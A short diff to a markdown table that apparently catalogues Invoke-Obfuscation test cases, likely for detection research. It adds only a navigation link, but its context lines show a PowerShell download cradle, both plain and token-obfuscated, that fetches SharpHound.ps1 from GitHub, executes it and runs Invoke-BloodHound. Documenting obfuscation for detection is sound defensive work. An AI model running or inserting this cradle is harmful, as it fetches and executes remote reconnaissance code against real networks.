@@ -27,6 +27,7 @@ SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('htt
 ##### MULTIPLE OBFUSCATION
 
 ### TOKEN OBFUSCATION
+[back to Contents:home:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
 | Case # | Option #1 | Option #2 | Option #3 | Result |
 | :---: | :---: | :---: | :---: | :--- |
 | 1 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(('ht'+'tp'+'s://raw.gith'+'ubus'+'e'+'rcont'+'ent.com/BloodHo'+'und'+'A'+'D'+'/B'+'loo'+'dHo'+'un'+'d/a7'+'e'+'a5'+'36'+'387'+'0d92'+'5bc31'+'d'+'3'+'a441a361f38b0a'+'add0b'+'/Inge'+'s'+'tors/'+'Shar'+'pHou'+'n'+'d'+'.ps'+'1')); Invoke-BloodHound 
